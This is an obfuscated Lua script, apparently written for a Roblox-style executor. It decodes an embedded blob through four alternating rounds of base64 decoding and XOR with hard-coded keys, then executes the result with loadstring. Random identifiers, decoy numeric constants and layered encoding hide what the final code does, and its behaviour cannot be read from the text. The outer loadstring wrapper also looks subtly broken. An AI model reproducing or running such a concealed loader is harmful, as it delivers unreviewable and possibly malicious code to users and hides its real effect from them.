
loadstring((function()
local _rhaggHohCTSz=string.char
local _JGyKsgIGcfex=string.byte
local _LCYyzBdYpEcB=math.floor
local _NyrXcHTIIZbY=table.concat
local _UycsHVxKMcDf=87613
local _hgJqhUQQQkzm=71796
local _zzojgXwLHWRf=82918
local _qNhQeMPRDgiN=56423
local _aQLChMGdAniC=24660
local _LNTKqWMnuBdI=76106

local function _IjaoMSJTTYWX(s)
  local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  local r={} local n=0 local num=0
  for i=1,#s do
    local c=s:sub(i,i)
    local v=b:find(c,1,true)
    if v then
      v=v-1; n=n+1; num=num*64+v
      if n==4 then
        r[#r+1]=_rhaggHohCTSz(_LCYyzBdYpEcB(num/65536),_LCYyzBdYpEcB(num/256)%256,num%256)
        n=0; num=0
      end
    end
  end
  if n==3 then
    r[#r+1]=_rhaggHohCTSz(_LCYyzBdYpEcB(num/1024),_LCYyzBdYpEcB(num/4)%256)
  elseif n==2 then
    r[#r+1]=_rhaggHohCTSz(_LCYyzBdYpEcB(num/16))
  end
  return _NyrXcHTIIZbY(r)
end
local function _buIiIfHfbdgB(s,k)
  local r={}
  for i=1,#s do
    local x=bit32.bxor(_JGyKsgIGcfex(s,i),_JGyKsgIGcfex(k,((i-1)%#k)+1))
    r[#r+1]=_rhaggHohCTSz(x)
  end
  return _NyrXcHTIIZbY(r)
end
local _SecZFtxELmYn=53347
local _NlosHnEXUSng=2972
local _YFButaJJQJVz=53679
local _JkNTaNpFnFbo=98826
local _LQbmdVgOqMDf=11436
local _cMvmRMPbEJgg=39212

local _iLUSIwsqRuGI=[=[IBwiKXsbEQovAyoieBssBCYeKj1RGjcRJiAUCW01OxEqEzYJZCEdICAdGBx4GwoFJhwye3kwLzEwAyIJejUsXy8lEBFwPjsvKjUyIHILP14kDQAZex0/ISUlR2F1GgEeLSwXE3EhYFI0VjYjdTMBKCQgSxV7ID8UKyccAXIwEkwsJRcXfAsvJiUTGDp2LjwiJg0pMXsaLy8hEzoHcw0BESkNS2J/MWhfJyMmZ1AxIAUlJTI5fxo/FCQTOgN7CBkELzYQPWQbNz8zCkM3dQs/FCYmMmZ3CGhfIiVHNXEdbA4oNiUXbDEBMDUdFCZ4IS8mK1Y6M3ggGSUlIAA0fj4ZIyATIRh4C2wXJycqAH0LOyUrJio2fQhlWg==]=]
_iLUSIwsqRuGI=_IjaoMSJTTYWX(_iLUSIwsqRuGI)
_iLUSIwsqRuGI=_buIiIfHfbdgB(_iLUSIwsqRuGI,"cdsP4YXg")
_iLUSIwsqRuGI=_IjaoMSJTTYWX(_iLUSIwsqRuGI)
_iLUSIwsqRuGI=_buIiIfHfbdgB(_iLUSIwsqRuGI,"nFskWQoJ")
_iLUSIwsqRuGI=_IjaoMSJTTYWX(_iLUSIwsqRuGI)
_iLUSIwsqRuGI=_buIiIfHfbdgB(_iLUSIwsqRuGI,"2yWYErSj")
_iLUSIwsqRuGI=_IjaoMSJTTYWX(_iLUSIwsqRuGI)
_iLUSIwsqRuGI=_buIiIfHfbdgB(_iLUSIwsqRuGI,"FNhwSeQl")
local f,err=loadstring(_iLUSIwsqRuGI)
if f then f() else error("Failed to load: "..tostring(err)) end
end)())
